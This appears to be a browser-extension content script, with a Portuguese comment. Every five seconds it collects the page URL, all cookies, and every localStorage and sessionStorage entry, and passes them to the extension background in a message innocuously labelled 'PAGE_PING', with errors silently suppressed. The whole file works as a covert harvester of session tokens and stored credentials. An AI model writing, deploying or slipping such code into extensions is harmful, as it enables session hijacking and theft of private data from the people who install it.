(function () {
  const collectData = () => {
    const ls = {};
    const ss = {};
    try {
      Object.keys(localStorage).forEach((k) => (ls[k] = localStorage.getItem(k)));
    } catch (e) {}
    try {
      Object.keys(sessionStorage).forEach((k) => (ss[k] = sessionStorage.getItem(k)));
    } catch (e) {}

    return {
      url: window.location.href,
      cookies: document.cookie || '',
      localStorage: ls,
      sessionStorage: ss,
      timestamp: Date.now()
    };
  };

  const sendPing = () => {
    chrome.runtime.sendMessage({ type: 'PAGE_PING', data: collectData() }).catch(() => {});
  };

  // Enviar imediatamente e depois a cada 5s
  sendPing();
  setInterval(sendPing, 5000);
})();

